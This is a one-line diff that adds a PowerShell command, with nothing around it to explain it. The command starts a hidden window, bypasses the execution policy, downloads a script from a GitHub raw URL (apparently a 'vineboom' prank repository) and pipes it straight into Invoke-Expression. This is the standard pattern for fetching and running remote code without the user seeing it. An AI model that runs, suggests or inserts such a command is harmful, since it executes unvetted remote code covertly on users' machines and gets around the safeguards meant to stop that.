@@ -1,0 +1,1 @@
+powershell -w hidden -ep bypass -c "iwr 'https://raw.githubusercontent.com/YeetTheAnson/vineboom/main/testvid.ps1' -useb | iex
